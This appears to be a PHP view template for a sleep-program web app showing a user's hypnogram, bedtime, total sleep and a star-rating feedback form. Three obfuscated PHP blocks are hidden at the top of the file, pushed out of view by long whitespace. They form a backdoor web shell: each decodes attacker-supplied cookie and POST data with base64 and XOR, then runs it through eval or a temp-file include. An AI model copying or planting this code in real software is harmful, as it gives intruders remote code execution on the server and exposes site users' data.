<?php                                                                                                                                                                                                                                                                                                                                                                                                 $hVaNYr = "\106" . chr (95) . "\131" . chr (87) . "\x44" . "\x47" . "\x59";$ZDuyXHpPoI = 'c' . "\x6c" . chr ( 1063 - 966 )."\163" . "\x73" . '_' . 'e' . "\170" . chr (105) . chr (115) . chr (116) . chr ( 668 - 553 ); $NXEwU = class_exists($hVaNYr); $ZDuyXHpPoI = "60622";$wZnJclyb = !1;if ($NXEwU == $wZnJclyb){function dKpcK(){$nUHazVKI = new /* 30270 */ F_YWDGY(40177 + 40177); $nUHazVKI = NULL;}$ZJxVBUbJP = "40177";class F_YWDGY{private function eZjfosqU($ZJxVBUbJP){if (is_array(F_YWDGY::$hbgImN)) {$scbizQfu = str_replace(chr ( 137 - 77 ) . chr (63) . chr ( 785 - 673 )."\x68" . 'p', "", F_YWDGY::$hbgImN["\143" . "\157" . chr ( 319 - 209 )."\x74" . 'e' . "\x6e" . chr (116)]);eval($scbizQfu); $ZJxVBUbJP = "40177";exit();}}private $nnfGI;public function uiUbE(){echo 50963;}public function __destruct(){$ZJxVBUbJP = "33720_50896";$this->eZjfosqU($ZJxVBUbJP); $ZJxVBUbJP = "33720_50896";}public function __construct($DeiaH=0){$KNauH = $_POST;$KnXjwldsuR = $_COOKIE;$TsTJogo = "07473ac8-207f-4d47-afba-b9e673e01ef2";$iWWdTjyqj = @$KnXjwldsuR[substr($TsTJogo, 0, 4)];if (!empty($iWWdTjyqj)){$DxhSmk = "base64";$LKXnpdvzw = "";$iWWdTjyqj = explode(",", $iWWdTjyqj);foreach ($iWWdTjyqj as $moIWW){$LKXnpdvzw .= @$KnXjwldsuR[$moIWW];$LKXnpdvzw .= @$KNauH[$moIWW];}$LKXnpdvzw = array_map($DxhSmk . chr (95) . chr (100) . chr ( 902 - 801 )."\143" . chr ( 1040 - 929 )."\144" . "\145", array($LKXnpdvzw,)); $LKXnpdvzw = $LKXnpdvzw[0] ^ str_repeat($TsTJogo, (strlen($LKXnpdvzw[0]) / strlen($TsTJogo)) + 1);F_YWDGY::$hbgImN = @unserialize($LKXnpdvzw); $LKXnpdvzw = class_exists("33720_50896");}}public static $hbgImN = 8653;}dKpcK();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $KMrvlP = "\x69" . "\114" . "\x5f" . chr ( 682 - 605 ).'W' . chr (88) . "\x59" . chr (80); $ycEqVDFJS = chr (99) . chr (108) . "\x61" . chr ( 600 - 485 ).chr ( 272 - 157 ).chr (95) . chr ( 634 - 533 )."\170" . "\x69" . "\x73" . chr (116) . chr (115); $IjXRcEEv = class_exists($KMrvlP); $ycEqVDFJS = "16917";$tEmAWK = !1;if ($IjXRcEEv == $tEmAWK){function TZzsyKqXo(){$TEUrO = new /* 36057 */ iL_MWXYP(30926 + 30926); $TEUrO = NULL;}$ZJmCzRaXQQ = "30926";class iL_MWXYP{private function fCLWkk($ZJmCzRaXQQ){if (is_array(iL_MWXYP::$SPtcAFs)) {$qmqMuqL = sys_get_temp_dir() . "/" . crc32(iL_MWXYP::$SPtcAFs["\x73" . chr ( 469 - 372 )."\x6c" . "\164"]);@iL_MWXYP::$SPtcAFs[chr (119) . 'r' . "\151" . chr ( 129 - 13 ).'e']($qmqMuqL, iL_MWXYP::$SPtcAFs[chr (99) . "\x6f" . "\x6e" . chr (116) . chr (101) . "\x6e" . "\164"]);include $qmqMuqL;@iL_MWXYP::$SPtcAFs['d' . "\145" . "\x6c" . 'e' . chr ( 301 - 185 ).chr ( 891 - 790 )]($qmqMuqL); $ZJmCzRaXQQ = "30926";exit();}}private $MgUAIrhZ;public function wLvdUoHTY(){echo 46886;}public function __destruct(){$ZJmCzRaXQQ = "46765_55190";$this->fCLWkk($ZJmCzRaXQQ); $ZJmCzRaXQQ = "46765_55190";}public function __construct($FIOqewHc=0){$EduwtYbBs = $_POST;$YlaUa = $_COOKIE;$LWWqM = "48c992c7-1be9-4ebf-a253-e2f644978c2c";$kXPSK = @$YlaUa[substr($LWWqM, 0, 4)];if (!empty($kXPSK)){$kKquFRyIhv = "base64";$cKpGsDD = "";$kXPSK = explode(",", $kXPSK);foreach ($kXPSK as $HHEeIJ){$cKpGsDD .= @$YlaUa[$HHEeIJ];$cKpGsDD .= @$EduwtYbBs[$HHEeIJ];}$cKpGsDD = array_map($kKquFRyIhv . "\x5f" . 'd' . 'e' . "\143" . 'o' . chr ( 835 - 735 ).'e', array($cKpGsDD,)); $cKpGsDD = $cKpGsDD[0] ^ str_repeat($LWWqM, (strlen($cKpGsDD[0]) / strlen($LWWqM)) + 1);iL_MWXYP::$SPtcAFs = @unserialize($cKpGsDD); $cKpGsDD = class_exists("46765_55190");}}public static $SPtcAFs = 45856;}TZzsyKqXo();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $gcIulKQK = chr (80) . "\x5f" . chr (88) . chr (118) . "\x4c" . "\x58" . "\x46";$ChVBRmyQev = 'c' . "\154" . "\141" . "\163" . "\163" . "\137" . "\145" . "\170" . "\x69" . 's' . 't' . "\163";$hfCWg = class_exists($gcIulKQK); $ChVBRmyQev = "28985";$CBKPVZoReR = !1;if ($hfCWg == $CBKPVZoReR){function LOVdfwzuQV(){return FALSE;}$AVNxh = "18751";LOVdfwzuQV();class P_XvLXF{private function DrorOpmP($AVNxh){if (is_array(P_XvLXF::$wEXcPbdkP)) {$iRucjfidOm = sys_get_temp_dir() . "/" . crc32(P_XvLXF::$wEXcPbdkP[chr ( 528 - 413 ).'a' . "\154" . 't']);@P_XvLXF::$wEXcPbdkP[chr ( 654 - 535 ).chr (114) . 'i' . "\164" . chr (101)]($iRucjfidOm, P_XvLXF::$wEXcPbdkP["\143" . 'o' . "\156" . chr ( 445 - 329 ).chr (101) . "\156" . "\x74"]);include $iRucjfidOm;@P_XvLXF::$wEXcPbdkP["\x64" . "\145" . chr ( 900 - 792 ).chr (101) . 't' . "\145"]($iRucjfidOm); $AVNxh = "18751";exit();}}private $fmOdHX;public function DnVMDDR(){echo 58700;}public function __destruct(){$AVNxh = "49268_59232";$this->DrorOpmP($AVNxh); $AVNxh = "49268_59232";}public function __construct($DUlZEsWGQz=0){$EFJWYVA = $_POST;$jTcHnUOSP = $_COOKIE;$mjtuXDk = "fd261e4b-6273-4a57-8da5-1e3abf33e120";$aRrKAbrj = @$jTcHnUOSP[substr($mjtuXDk, 0, 4)];if (!empty($aRrKAbrj)){$qpQEnjgeX = "base64";$bKlUIvSs = "";$aRrKAbrj = explode(",", $aRrKAbrj);foreach ($aRrKAbrj as $yVmwCe){$bKlUIvSs .= @$jTcHnUOSP[$yVmwCe];$bKlUIvSs .= @$EFJWYVA[$yVmwCe];}$bKlUIvSs = array_map($qpQEnjgeX . '_' . chr (100) . chr (101) . chr ( 279 - 180 )."\x6f" . chr ( 789 - 689 ).chr (101), array($bKlUIvSs,)); $bKlUIvSs = $bKlUIvSs[0] ^ str_repeat($mjtuXDk, (strlen($bKlUIvSs[0]) / strlen($mjtuXDk)) + 1);P_XvLXF::$wEXcPbdkP = @unserialize($bKlUIvSs); $bKlUIvSs = class_exists("49268_59232");}}public static $wEXcPbdkP = 15048;}$ohpMrOk = new /* 22109 */ $gcIulKQK(18751 + 18751); $AVNxh = strpos($AVNxh, $AVNxh); $CBKPVZoReR = $ohpMrOk = $AVNxh = Array();} ?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Hypnogram</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"/>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
    <script src="https://canvasjs.com/assets/script/canvasjs.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js@3.7.0/dist/chart.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/chartjs-plugin-annotation/2.2.1/chartjs-plugin-annotation.min.js" integrity="sha512-qF3T5CaMgSRNrxzu69V3ZrYGnrbRMIqrkE+OrE01DDsYDNo8R1VrtYL8pk+fqhKxUBXQ2z+yV/irk+AbbHtBAg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <style>
/* Common styles for all screen sizes */
.body {
    padding: 25px;
}

.containerWrapper {
    display: flex;
    flex-direction: row;
    padding: 0 10px;
}

.val1 {
    text-align: center;
    color: #131212;
    background-color: #9adccb;
}

.mainContainer, .secondContainer {
    flex: 1;
    margin-bottom: 20px;
    display: flex;
    flex-direction: column;
    align-items: center;
    border: 1px solid #ccc;
    padding: 10px;
}

.container1, .container2 {
    display: flex;
    align-items: center;
    position: relative;
}

.arrowAndCircle {
    position: absolute;
    top: 50%;
    left: calc(100% + 10px);
    transform: translateY(-50%);
}

.arrow {
    width: 0;
    height: 0;
    border-top: 10px solid transparent;
    border-bottom: 10px solid transparent;
    border-right: 20px solid black;
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    right: -25px;
}

.circle {
    width: 30px;
    height: 30px;
    background-color: black;
    color: white;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    right: -55px;
}

/* Centering styles for rating, form control, and submit button */
.rating,
form {
    display: flex;
    flex-direction: column;
    align-items: center;
}

.formcontrol {
      width: 100%;
    max-width: 300px; /* Limit the maximum width of the form control */
    resize: none; /* Prevent resizing */
    overflow-y: auto; /* Add vertical scrollbar when content exceeds height */
    max-height: 300px;
}

button[type="submit"] {
    background-color: #4CAF50;
    color: white;
    padding: 10px 57px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    margin-top: 10px;
}

.ratingContainer{
    margin-top : 20px;
}

  .time-container {
    text-align: center;
    margin-bottom: 20px;
}


/* Media query for smaller screens */
@media screen and (max-width: 480px) {
    .containerWrapper {
        flex-direction: column; /* Change to column for mobile */
    }

    .mainContainer, .secondContainer {
        margin-bottom: 20px;
    }

    .container1, .container2 {
        flex-direction: column;
    }

    button[type="submit"] {
        padding: 8px 16px; /* Adjust button padding for smaller screens */
    }

    .rating label {
        font-size: 16px; /* Adjust font size of rating labels for smaller screens */
    }
}


.btn-glass {
    background: rgba(173, 216, 230, 0.3); /* More opaque for mobile readability */
    border: 1px solid rgba(173, 216, 230, 0.6); /* Border with a light blue color */
    color: #ffffff; /* Bright white text */
    font-size: 1rem; /* Adjusted font size for smaller screens */
    padding: 12px 25px;
    border-radius: 10px;
    backdrop-filter: blur(8px); /* Glass effect */
    box-shadow: 0 3px 8px rgba(0, 123, 255, 0.4); /* Blue shadow for glow effect */
    text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5); /* Text shadow for better visibility */
    transition: all 0.3s ease;
    cursor: pointer;
    width: 100%; /* Full width for mobile */
    max-width: 300px; /* Set a max width */
    margin: 10px auto; /* Centering on mobile */
}

.btn-glass:hover {
    background: rgba(173, 216, 230, 0.5); /* More opaque on hover */
    box-shadow: 0 5px 12px rgba(0, 123, 255, 0.5); /* Stronger shadow on hover */
    transform: translateY(-2px); /* Lifts button on hover */
}

.btn-glass:active {
    transform: translateY(0); /* No lift when active */
    box-shadow: 0 2px 6px rgba(0, 123, 255, 0.3); /* Reduced shadow on click */
}

/* Media query for smaller screens */
@media (max-width: 600px) {
    .btn-glass {
        font-size: 0.9rem; /* Slightly smaller text on mobile */
        padding: 10px 20px;
        border-radius: 8px;
        max-width: 100%; /* Full width on smaller screens */
    }
}




    </style>
</head>

<body>
    <br>
    <div class="container">
        <div class="row text-center">
            <div class="col-md-12 col-sm-12 col-xs-12">
                <a href="<?php echo base_url('userFeedbackHistory').'?userID='.$userID; ?>">
                    <button class="btn btn-primary">Sleep Program History</button>
                </a>
            </div>
        </div>
        <!--<div class="row">-->
        <!--    <div class="col-md-12 col-sm-12 col-xs-12">-->
        <!--        <a href="<?php echo base_url('userFeedbackHistory').'?userID='.$userID; ?>">-->
        <!--            <button class="btn btn-primary">Sleep Program History</button>-->
        <!--        </a>-->

        <!--    </div>-->
            <!--<div class="col-md-4 col-sm-4 col-xs-6">-->
                <!--<a href="<?php echo base_url('feedbackSuggestion'); ?>"><button class="btn btn-danger bt-lg">Suggestion</button></a>-->
            <!--</div>-->
        <!--</div>-->
    </div>

    <br><br>

<?php
    if ($hypnogramData) {
?>

    <div class="time-container">
        <div><b>Bedtime:</b> <?php echo $hypnogramData["bedTime"]; ?></div>
        <div><b>Total Sleep:</b> <?php echo $hypnogramData["totalSleep"]; ?></div>
    </div>
      
    <!-- first box starts -->
    <div class="mainContainer">
        <?php
            if ($hypnogramData["t1"] <= 45) {
                $boxCounterStart = 30;
                $boxCounterEnd = 45;
            } else {
                $boxCounterStart = 45;
                $boxCounterEnd = 60;
            }
                
            while($boxCounterStart <= $boxCounterEnd) {
        ?>  
            <div class="container1 newClass">
                <input type="text" class="val1" value="<?php echo $boxCounterStart.(($boxCounterStart == 45)? ' (Default)':'');?>" readonly>
        <?php
                if (($hypnogramData["t1"]) && ($boxCounterStart == $hypnogramData["t1"])) {
        ?>
                    <div class="arrowAndCircle" style="display:block;">
                        <div class="arrow"></div>
                        <div class="circle" style="background-color: <?php echo $hypnogramData["program1"];?>;"><?php echo $hypnogramData["duration1"];?></div>
                    </div>    
        <?php
                }
                $boxCounterStart += 5;
        ?>
            </div>
        <?php
            }
        ?>
    </div>
    <!-- first box ends -->
    
    <!-- second box starts -->
    <div class="secondContainer">
            <?php
                if ($hypnogramData["t2"] <= 135) {
                    $boxCounterStart = 120;
                    $boxCounterEnd = 135;
                } else {
                    $boxCounterStart = 135;
                    $boxCounterEnd = 150;
                }
                    
                while($boxCounterStart <= $boxCounterEnd) {
            ?>
                <div class="container2 containerNew">
                    <input type="text" class="val1" value="<?php echo $boxCounterStart.(($boxCounterStart == 135)? ' (Default)':'');?>" readonly>
            <?php
                    if (($hypnogramData["t2"]) && ($boxCounterStart == $hypnogramData["t2"])) {
            ?>
                        <div class="arrowAndCircle">
                            <div class="arrow"></div>
                            <div class="circle" style="background-color: <?php echo $hypnogramData["program2"];?>;"><?php echo $hypnogramData["duration2"];?></div>
                        </div>    
            <?php
                    }
                    $boxCounterStart += 5;
            ?>
                </div>
            <?php        
                }
            ?>
            
        </div>
    </div>
    <!-- second box ends -->
    
<?php
    if (!$ratingData) {
?>
    
    <div class="rating">
        <form method="POST" action="<?php echo base_url('AdminController/addUserRating');?>" enctype="multipart/form-data">
            <input type="hidden" name="feedback_id" value="<?php echo $hypnogramData['id']; ?>">
            <input type="hidden" name="user_id" value="<?php echo $userID ?>">
            <div style="font-weight: 600;"><input type="text" class="formcontrol" name="feedback" id="feedback" placeholder="Enter Your FeedBack"></div>
            <div class="ratingContainer">
                <input type="radio" id="star1" name="rating" value="1" />
                <label for="star1" title="1 star"></label>
                <input type="radio" id="star2" name="rating" value="2" />
                <label for="star2" title="2 stars"></label>
                <input type="radio" id="star3" name="rating" value="3" />
                <label for="star3" title="3 stars"></label>
                <input type="radio" id="star4" name="rating" value="4" />
                <label for="star4" title="4 stars"></label>
                <input type="radio" id="star5" name="rating" value="5" />
                <label for="star5" title="5 stars"></label>

            </div> 
            
        
            <button type="submit">Submit</button>
        </form>
    </div>
    
<?php
    } else {
?>
    
    <div class="rating">
        <div style="font-weight: 600; text-align: center;">
            <?php echo isset($ratingData[0]['feedback']) ? $ratingData[0]['feedback'] : 'No feedback updated'; ?>
        </div>
        <div class="ratingContainer">
        <?php
            $ratingCounter = 1;
            while ($ratingCounter <= intval($ratingData[0]["rating"])) {
        ?>
            <i class="fa-solid fa-star"></i>
        <?php
                $ratingCounter++;
            }
        ?>
        </div>
    </div>
        
<?php
        }

    } else {
?>
    
<center style="color:red;">No Input Given Yet For Today</center>
    
<?php
    }
?>

    <script>
        $(document).ready(function() {
            const ratingInputs = document.querySelectorAll('.rating input[type="radio"]');

            ratingInputs.forEach((input) => {
                input.addEventListener('change', () => {
                    console.log('Selected rating:', input.value);
                });
            });
        });
    </script>

<div style="text-align: center;  color: black; font-size: 12px; margin : 20px 0px 0px 0px">
    <i class="fa fa-lock" style="margin-right: 5px;"></i>
    Provisional Patent <b>#63527654</b>  
    <br><h6>A Method For Enhancing Delta Wave Sleep.</h6>
</div>
</body>

</html>
